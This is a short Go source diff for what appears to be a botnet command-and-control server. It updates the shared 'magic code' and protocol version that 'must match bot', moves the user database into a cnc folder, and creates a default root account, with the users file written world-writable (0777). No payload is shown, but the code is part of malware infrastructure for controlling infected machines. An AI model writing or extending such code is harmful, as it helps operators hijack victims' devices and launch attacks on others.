@@ -12,7 +12,7 @@ import (
 
 const (
 	// File paths
-	USERS_FILE = "users.json"
+	USERS_FILE = "cnc/users.json"
 
 	// Server IPs
 	USER_SERVER_IP = "0.0.0.0"
@@ -25,8 +25,8 @@ const (
 	USER_SERVER_PORT = "420"
 
 	// Authentication  these must match bot
-	MAGIC_CODE       = "jDk@5s3qcoo2HvIA"
-	PROTOCOL_VERSION = "v3.4.58"
+	MAGIC_CODE       = "avxy59r1#MSk^bBK"
+	PROTOCOL_VERSION = "V3_1"
 )
 
 type BotConnection struct {
@@ -118,7 +118,7 @@ func main() {
 	tuiMode = !splitMode
 
 	// First run: Create default root user with random 12-char password
-	if _, fileError := os.ReadFile("users.json"); fileError != nil {
+	if _, fileError := os.ReadFile(USERS_FILE); fileError != nil {
 		password, err := randomString(12)
 		if err != nil {
 			fmt.Println("Error generating password:", err)
@@ -138,7 +138,7 @@ func main() {
 			return
 		}
 
-		if err := os.WriteFile("users.json", bytes, 0777); err != nil {
+		if err := os.WriteFile(USERS_FILE, bytes, 0777); err != nil {
 			fmt.Println("Error writing to users.json:", err)
 			return
 		}
